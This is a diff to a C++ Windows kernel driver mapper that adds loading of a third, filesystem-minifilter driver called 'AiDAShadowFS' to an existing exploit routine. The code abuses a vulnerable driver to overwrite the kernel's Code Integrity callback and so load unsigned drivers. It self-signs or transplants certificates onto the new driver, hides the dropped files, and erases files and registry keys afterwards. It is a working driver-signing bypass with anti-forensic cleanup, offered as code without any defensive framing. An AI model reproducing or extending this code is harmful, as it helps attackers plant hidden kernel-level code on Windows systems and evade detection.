@@ -356,7 +356,8 @@ namespace Utils {
 
 namespace MapperCore {
 
-    NTSTATUS TriggerExploit(PCWSTR targetDriverFileName, PCWSTR sentinelDriverFileName) {
+    NTSTATUS TriggerExploit(PCWSTR targetDriverFileName, PCWSTR sentinelDriverFileName,
+                            PCWSTR shadowFsDriverFileName) {
         LOG("=== TriggerExploit START ===");
         LOG("Target driver: %ls", targetDriverFileName ? targetDriverFileName : L"(null)");
         LOG("Sentinel driver: %ls", sentinelDriverFileName ? sentinelDriverFileName : L"(null)");
@@ -434,6 +435,15 @@ namespace MapperCore {
                             LOG("Skipping Sentinel load because target driver failed");
                         }
 
+                        NTSTATUS shadowFsStatus = STATUS_UNSUCCESSFUL;
+                        if (NT_SUCCESS(status) && shadowFsDriverFileName && g_ShadowFsServicePath[0]) {
+                            LOG("Loading shadowfs driver, service path: %ls", g_ShadowFsServicePath);
+                            shadowFsStatus = DriverLoader::LoadDriver(g_ShadowFsServicePath);
+                            LOG_STATUS("LoadDriver (ShadowFS)", shadowFsStatus);
+                        } else if (!NT_SUCCESS(status)) {
+                            LOG("Skipping ShadowFS load because target driver failed");
+                        }
+
                         LOG("Restoring original CI callback %p...", originalCallback);
                         NTSTATUS restoreStatus = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                         LOG_STATUS("WriteKernelMemory (CI restore)", restoreStatus);
@@ -448,6 +458,12 @@ namespace MapperCore {
                                 LOG("Patching driver signing flags for sentinel: %ls", sentinelDriverFileName);
                                 patchResult = KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName);
                                 LOG("PatchDriverSigningFlags (sentinel): %s", patchResult ? "OK" : "FAILED");
+                            }
+
+                            if (NT_SUCCESS(shadowFsStatus) && shadowFsDriverFileName) {
+                                LOG("Patching driver signing flags for shadowfs: %ls", shadowFsDriverFileName);
+                                patchResult = KernelUtils::PatchDriverSigningFlags(deviceHandle, shadowFsDriverFileName);
+                                LOG("PatchDriverSigningFlags (shadowfs): %s", patchResult ? "OK" : "FAILED");
                             }
                         }
                     } else {
@@ -496,11 +512,13 @@ namespace MapperCore {
         return status;
     }
 
-    NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath, PCWSTR sentinelPath) {
+    NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath, PCWSTR sentinelPath,
+                            PCWSTR shadowFsPath) {
         LOG("=== WindLoadDriver START ===");
         LOG("loaderPath: %ls", loaderPath ? loaderPath : L"(null)");
         LOG("driverPath: %ls", driverPath ? driverPath : L"(null)");
         LOG("sentinelPath: %ls", sentinelPath ? sentinelPath : L"(null)");
+        LOG("shadowFsPath: %ls", shadowFsPath ? shadowFsPath : L"(null)");
 
         NTSTATUS status = Utils::AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
         LOG_STATUS("AdjustPrivilege (SeLoadDriverPrivilege)", status);
@@ -551,6 +569,26 @@ namespace MapperCore {
             status = DriverLoader::CreateDriverService(g_SentinelServicePath, sentinelFullPath);
             LOG_STATUS("CreateDriverService (sentinel)", status);
             LOG("Sentinel service path: %ls", g_SentinelServicePath);
+            if (!NT_SUCCESS(status)) {
+                return status;
+            }
+        }
+
+        WCHAR shadowFsFullPath[520] = {};
+        if (shadowFsPath && shadowFsPath[0]) {
+            status = Utils::GetFullPath(shadowFsPath, shadowFsFullPath, sizeof(shadowFsFullPath));
+            LOG_STATUS("GetFullPath (shadowfs)", status);
+            if (!NT_SUCCESS(status)) {
+                return status;
+            }
+            LOG("ShadowFS full path: %ls", shadowFsFullPath);
+            status = DriverLoader::CreateMinifilterService(
+                g_ShadowFsServicePath,
+                shadowFsFullPath,
+                L"AiDAShadowFS Instance",
+                L"385701");
+            LOG_STATUS("CreateMinifilterService (shadowfs)", status);
+            LOG("ShadowFS service path: %ls", g_ShadowFsServicePath);
             if (!NT_SUCCESS(status)) {
                 return status;
             }
@@ -667,8 +705,15 @@ namespace MapperCore {
             else sentinelFileName = sentinelFullPath;
         }
 
+        PCWSTR shadowFsFileName = nullptr;
+        if (shadowFsFullPath[0]) {
+            shadowFsFileName = wcsrchr(shadowFsFullPath, L'\\');
+            if (shadowFsFileName) shadowFsFileName++;
+            else shadowFsFileName = shadowFsFullPath;
+        }
+
         LOG("Calling TriggerExploit...");
-        status = TriggerExploit(targetFileName, sentinelFileName);
+        status = TriggerExploit(targetFileName, sentinelFileName, shadowFsFileName);
         LOG_STATUS("TriggerExploit", status);
         if (NT_SUCCESS(status)) {
             LOG("Cleaning up driver file: %ls", driverFullPath);
@@ -680,6 +725,12 @@ namespace MapperCore {
 
             if (sentinelFullPath[0]) {
                 if (Utils::ForceDeleteOrRename(sentinelFullPath)) {
+                } else {
+                }
+            }
+
+            if (shadowFsFullPath[0]) {
+                if (Utils::ForceDeleteOrRename(shadowFsFullPath)) {
                 } else {
                 }
             }
@@ -891,6 +942,10 @@ namespace MapperCore {
 
         if (wcslen(g_SentinelServicePath) > 0) {
             deleteRegistryTree(g_SentinelServicePath);
+        }
+
+        if (wcslen(g_ShadowFsServicePath) > 0) {
+            deleteRegistryTree(g_ShadowFsServicePath);
         }
 
         return STATUS_SUCCESS;
@@ -1151,6 +1206,17 @@ int main(int argc, char* argv[]) {
     }
     LOG("Sentinel arg: %ls", sentinelArg.empty() ? L"(none)" : sentinelArg.c_str());
 
+    std::wstring shadowFsArg;
+    if (argc >= 4) {
+        int wideLen = MultiByteToWideChar(CP_ACP, 0, argv[3], -1, nullptr, 0);
+        if (wideLen > 0) {
+            shadowFsArg.resize(static_cast<size_t>(wideLen));
+            MultiByteToWideChar(CP_ACP, 0, argv[3], -1, &shadowFsArg[0], wideLen);
+            shadowFsArg.resize(wcslen(shadowFsArg.c_str()));
+        }
+    }
+    LOG("ShadowFS arg: %ls", shadowFsArg.empty() ? L"(none)" : shadowFsArg.c_str());
+
     if (g_P2CDriverSize == 0) {
         LOG("FATAL: g_P2CDriverSize == 0 after init");
         ReleaseDriverData();
@@ -1252,11 +1318,47 @@ int main(int argc, char* argv[]) {
 
     SetFileAttributesW(driverFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
 
+    std::wstring shadowFsFilePath;
+    if (!shadowFsArg.empty()) {
+        shadowFsFilePath = Utils::GetTempFilePath(L".sys");
+        LOG("ShadowFS temp path: %ls", shadowFsFilePath.c_str());
+        if (shadowFsFilePath.empty()) {
+            LOG("FATAL: Failed to generate shadowfs temp path");
+            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
+            Utils::ForceDeleteOrRename(driverFilePath.c_str());
+            if (!sentinelFilePath.empty())
+                Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
+            if (g_LogFile) fclose(g_LogFile);
+            return 1;
+        }
+        LOG("Copying shadowfs from %ls to %ls", shadowFsArg.c_str(), shadowFsFilePath.c_str());
+        if (!CopyFileW(shadowFsArg.c_str(), shadowFsFilePath.c_str(), FALSE)) {
+            LOG("FATAL: CopyFileW for shadowfs failed, GLE=%u", GetLastError());
+            Utils::ForceDeleteOrRename(loaderFilePath.c_str());
+            Utils::ForceDeleteOrRename(driverFilePath.c_str());
+            if (!sentinelFilePath.empty())
+                Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
+            if (g_LogFile) fclose(g_LogFile);
+            return 1;
+        }
+
+        LOG("Self-signing shadowfs driver...");
+        if (!SignedMemory::SelfSignDriver(shadowFsFilePath.c_str())) {
+            LOG("SelfSignDriver (shadowfs) failed, trying TransplantCertificate...");
+            SignedMemory::TransplantCertificateToDriver(shadowFsFilePath.c_str());
+        } else {
+            LOG("SelfSignDriver (shadowfs) OK");
+        }
+        SetFileAttributesW(shadowFsFilePath.c_str(),
+                           FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
+    }
+
     LOG("=== Calling WindLoadDriver ===");
     NTSTATUS status = MapperCore::WindLoadDriver(
         loaderFilePath.c_str(),
         driverFilePath.c_str(),
-        sentinelFilePath.empty() ? nullptr : sentinelFilePath.c_str());
+        sentinelFilePath.empty() ? nullptr : sentinelFilePath.c_str(),
+        shadowFsFilePath.empty() ? nullptr : shadowFsFilePath.c_str());
     LOG_STATUS("WindLoadDriver final result", status);
 
     if (NT_SUCCESS(status)) {
@@ -1269,6 +1371,8 @@ int main(int argc, char* argv[]) {
     Utils::ForceDeleteOrRename(driverFilePath.c_str());
     if (!sentinelFilePath.empty())
         Utils::ForceDeleteOrRename(sentinelFilePath.c_str());
+    if (!shadowFsFilePath.empty())
+        Utils::ForceDeleteOrRename(shadowFsFilePath.c_str());
 
     MapperCore::CleanupArtifacts();
 
